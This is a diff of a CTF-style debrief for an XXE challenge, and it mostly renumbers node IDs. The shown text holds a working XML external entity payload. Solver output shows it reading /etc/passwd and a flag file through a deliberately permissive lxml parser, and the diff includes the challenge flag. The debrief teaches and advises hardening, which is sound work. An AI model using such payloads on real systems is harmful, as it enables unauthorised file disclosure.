@@ -1,6 +1,6 @@
 # The King's Sealed Archives, Debrief
 
-**Node:** `p5_3` &middot; **Flag:** `SEIYAKU{external_entity_unsealed}` &middot; **Route:** `POST /p5/archives` &middot; **Sink:** `challenges/phase5.py`, real `lxml` parser via `core/xml_parser.parse()` &middot; **Signal:** the echoed `<document>` element's resolved text, reading a real file's contents on the container's filesystem
+**Node:** `p5_4` &middot; **Flag:** `SEIYAKU{external_entity_unsealed}` &middot; **Route:** `POST /p5/archives` &middot; **Sink:** `challenges/phase5.py`, real `lxml` parser via `core/xml_parser.parse()` &middot; **Signal:** the echoed `<document>` element's resolved text, reading a real file's contents on the container's filesystem
 
 ## DTDs and entities, briefly
 
@@ -36,7 +36,7 @@ parser = etree.XMLParser(
 )
 ```
 
-p5_2 used this exact same parser and was never exploitable via XXE,
+p5_3 used this exact same parser and was never exploitable via XXE,
 because nothing in that route ever gave a caller-supplied DOCTYPE a
 reason to matter, the bug there was upstream of parsing entirely. This
 floor's route, `p5_archives()`, is where the same permissive parser
@@ -44,7 +44,7 @@ configuration becomes reachable: it parses a caller-supplied document
 and then **echoes back an element's resolved text**:
 
 ```python
-# challenges/phase5.py, p5_3
+# challenges/phase5.py, p5_4
 doc = xml_parser.parse(raw_xml.encode("utf-8"))
 title_el = doc.find(".//document")
 document_title = title_el.text if title_el is not None else None
@@ -155,7 +155,7 @@ external-entity read.
 
 ## The full solver, live
 
-`solvers/p5_3.sh` runs all three checks below against the real running
+`solvers/p5_4.sh` runs all three checks below against the real running
 stack, in order: (1) an ordinary request echoes back exactly its own
 plain title, (2) an XXE payload against `/etc/passwd` proves general
 file-read, (3) an XXE payload against the sealed `/opt/king/flag.txt`
@@ -164,19 +164,19 @@ against this exact build (`SEIYAKU_BASE` was the default
 `http://localhost:8000` for this run):
 
 ```
-[p5_3] target: http://localhost:8000/p5/archives
-[p5_3] step 1, ordinary request, no DOCTYPE
+[p5_4] target: http://localhost:8000/p5/archives
+[p5_4] step 1, ordinary request, no DOCTYPE
   response: {"document_title":"ancient-history-vol-3","error":null,"raw_xml":"<request><document>ancient-history-vol-3</document></request>"}
   ok: ordinary request echoed back exactly its own plain title
-[p5_3] step 2, XXE file read: file:///etc/passwd
+[p5_4] step 2, XXE file read: file:///etc/passwd
   response (truncated): {"document_title":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...
   ok: /etc/passwd contents genuinely read back through the entity
-[p5_3] step 3, XXE file read: file:///opt/king/flag.txt
+[p5_4] step 3, XXE file read: file:///opt/king/flag.txt
   response: {"document_title":"SEIYAKU{external_entity_unsealed}\n","error":null,"raw_xml":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///opt/king/flag.txt\">]><request><document>&xxe;</document></request>"}
   ok: sealed archive file read via external entity, flag recovered: SEIYAKU{external_entity_unsealed}
-[p5_3] ok: ordinary request clean, /etc/passwd read confirms general file-read,
-[p5_3]     sealed flag file read via a real external entity
-[p5_3] PASS
+[p5_4] ok: ordinary request clean, /etc/passwd read confirms general file-read,
+[p5_4]     sealed flag file read via a real external entity
+[p5_4] PASS
 ```
 
 ## HxH analogy
@@ -217,8 +217,8 @@ about something in the catalogue at all.
   than just mitigating it.
 - **If XML is required, use an allow-listed, hardened parser
   configuration everywhere, with no per-route exceptions.** The
-  contrast between p5_2 (same parser config, not exploitable, no
-  reflecting sink) and p5_3 (same parser config, fully exploitable, a
+  contrast between p5_3 (same parser config, not exploitable, no
+  reflecting sink) and p5_4 (same parser config, fully exploitable, a
   reflecting sink) is exactly why "this route probably doesn't need it"
   is the wrong question to ask about parser hardening: the unsafe
   setting is dormant, not harmless, until some future route gives it a
